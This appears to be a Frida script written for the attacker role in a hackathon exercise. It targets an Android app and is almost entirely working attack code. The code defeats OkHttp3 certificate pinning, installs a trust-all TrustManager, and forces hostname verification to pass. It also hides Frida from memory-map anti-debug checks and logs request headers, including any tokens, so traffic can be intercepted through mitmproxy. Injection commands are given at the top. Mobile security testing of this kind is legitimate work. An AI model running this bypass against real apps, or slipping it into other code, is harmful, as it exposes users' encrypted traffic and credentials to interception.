/**
 * ================================================================
 *  Frida Script: TLS Certificate Pinning Bypass
 *  Hackathon #31 — Attacker Side (Person 3: Pinning Bypass)
 *  MITRE ATT&CK: T1557 - Adversary-in-the-Middle
 * ================================================================
 *
 * WHAT THIS DOES:
 *   Hooks OkHttp3 CertificatePinner.check() at runtime so it
 *   never throws a CertificatePinningException — allowing any
 *   certificate (i.e. the mitmproxy CA cert) to be accepted.
 *
 *   Also hooks Android's standard TrustManager so all system-level
 *   SSL validation is bypassed too.
 *
 * USAGE:
 *   # Make sure Frida server is running on the device/emulator
 *   adb push frida-server /data/local/tmp/
 *   adb shell "chmod 755 /data/local/tmp/frida-server"
 *   adb shell "/data/local/tmp/frida-server &"
 *
 *   # Inject into the running app
 *   frida -U -n com.example.secureapp -s bypass_pinning.js
 *
 *   # OR spawn-inject (works even if app anti-debugs on attach)
 *   frida -U -f com.example.secureapp -s bypass_pinning.js --no-pause
 * ================================================================
 */

"use strict";

// ── Colour helpers for console output ────────────────────────
const R = "\x1b[31m", G = "\x1b[32m", Y = "\x1b[33m",
      C = "\x1b[36m", W = "\x1b[37m", RST = "\x1b[0m";

function log(tag, msg) {
    console.log(`${C}[FRIDA]${RST} ${Y}[${tag}]${RST} ${msg}`);
}

// ── Wait for Java VM ─────────────────────────────────────────
Java.perform(function () {

    log("INIT", "Java.perform() running — hooks installing...");

    /* -------------------------------------------------------
     * 1. OkHttp3 — CertificatePinner.check()
     *    This is the EXACT method the target app calls.
     *    Making it a no-op means pinning never fires.
     * ------------------------------------------------------- */
    try {
        const CertificatePinner = Java.use("okhttp3.CertificatePinner");

        // Overload: check(String hostname, List<Certificate> peerCertificates)
        CertificatePinner.check.overload(
            "java.lang.String",
            "java.util.List"
        ).implementation = function (hostname, certs) {
            log("OkHttp3", `check() called for hostname: ${hostname}`);
            log("OkHttp3", `${G}✓ Bypassed — returning without throwing${RST}`);
            // Do NOT call this.check(...) — just return to suppress exception
            return;
        };

        // Overload: check(String hostname, Certificate... certificates)  [older OkHttp]
        CertificatePinner.check.overload(
            "java.lang.String",
            "[Ljava.security.cert.Certificate;"
        ).implementation = function (hostname, certs) {
            log("OkHttp3", `check() [varargs] called for hostname: ${hostname}`);
            log("OkHttp3", `${G}✓ Bypassed — returning without throwing${RST}`);
            return;
        };

        log("OkHttp3", `${G}CertificatePinner hooked successfully!${RST}`);

    } catch (e) {
        log("OkHttp3", `${R}Hook failed: ${e.message}${RST}`);
    }


    /* -------------------------------------------------------
     * 2. X509TrustManager — system TLS validation
     *    Hooks ALL TrustManager implementations so even
     *    non-OkHttp HTTPS calls (HttpsURLConnection etc.)
     *    accept any certificate.
     * ------------------------------------------------------- */
    try {
        const X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
        const SSLContext        = Java.use("javax.net.ssl.SSLContext");

        // Build a permissive TrustManager that accepts everything
        const TrustManagerImpl = Java.registerClass({
            name: "com.frida.bypass.PermissiveTrustManager",
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted(chain, authType) {},
                checkServerTrusted(chain, authType) {
                    log("TrustManager", `checkServerTrusted() called — accepting cert`);
                },
                getAcceptedIssuers() {
                    return Java.array("java.security.cert.X509Certificate", []);
                },
            }
        });

        const permissiveTM = TrustManagerImpl.$new();
        const tmArray = Java.array(
            "javax.net.ssl.TrustManager",
            [permissiveTM]
        );

        const sslCtx = SSLContext.getInstance("TLS");
        sslCtx.init(null, tmArray, null);
        SSLContext.getDefault.implementation = function () {
            log("SSLContext", `${G}Returning permissive SSLContext${RST}`);
            return sslCtx;
        };

        log("TrustManager", `${G}Permissive TrustManager installed!${RST}`);

    } catch (e) {
        log("TrustManager", `${R}Hook failed: ${e.message}${RST}`);
    }


    /* -------------------------------------------------------
     * 3. Hostname Verifier — bypass SNI/hostname checks
     * ------------------------------------------------------- */
    try {
        const HostnameVerifier = Java.use("javax.net.ssl.HostnameVerifier");
        const HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");

        HttpsURLConnection.setDefaultHostnameVerifier.implementation = function (verifier) {
            // Install our own that always returns true
            const bypassVerifier = Java.proxy("javax.net.ssl.HostnameVerifier", {
                verify(hostname, session) {
                    log("HostnameVerifier", `verify("${hostname}") → true`);
                    return true;
                }
            });
            this.setDefaultHostnameVerifier(bypassVerifier);
        };

        log("HostnameVerifier", `${G}Hostname verifier hooked!${RST}`);

    } catch (e) {
        log("HostnameVerifier", `${R}Hook failed: ${e.message}${RST}`);
    }


    /* -------------------------------------------------------
     * 4. Anti-Frida detection bypass
     *    The target app reads /proc/self/maps looking for
     *    "frida". We hook File.exists() and the BufferedReader
     *    to hide frida-agent strings.
     * ------------------------------------------------------- */
    try {
        const BufferedReader = Java.use("java.io.BufferedReader");

        BufferedReader.readLine.implementation = function () {
            const line = this.readLine();
            if (line && line.toLowerCase().indexOf("frida") !== -1) {
                log("AntiDetect", `${Y}Hiding frida map entry: ${line}${RST}`);
                return null;   // pretend this line doesn't exist
            }
            return line;
        };

        log("AntiDetect", `${G}Frida memory-map detection bypass active!${RST}`);

    } catch (e) {
        log("AntiDetect", `${R}Hook failed: ${e.message}${RST}`);
    }


    /* -------------------------------------------------------
     * 5. Traffic spy — log all OkHttp requests & responses
     *    in real-time from within the app process.
     * ------------------------------------------------------- */
    try {
        const OkHttpClient  = Java.use("okhttp3.OkHttpClient");
        const Request       = Java.use("okhttp3.Request");
        const RealCall      = Java.use("okhttp3.internal.connection.RealCall");

        RealCall.execute.implementation = function () {
            const req = this.request();
            log("Spy", `${W}EXECUTING: ${req.method()} ${req.url()}${RST}`);

            const headers = req.headers();
            for (let i = 0; i < headers.size(); i++) {
                log("Spy", `  Header: ${headers.name(i)}: ${headers.value(i)}`);
            }

            const resp = this.execute();
            log("Spy", `${G}RESPONSE: ${resp.code()} ${resp.message()}${RST}`);
            return resp;
        };

        log("Spy", `${G}OkHttp request spy installed!${RST}`);

    } catch (e) {
        log("Spy", `${R}Spy hook failed (may be different OkHttp internal): ${e.message}${RST}`);
    }

    log("INIT", `${G}All hooks installed. Waiting for app to make HTTPS calls...${RST}`);
    log("INIT", `${G}Traffic will flow through mitmproxy at 127.0.0.1:8080${RST}`);
});
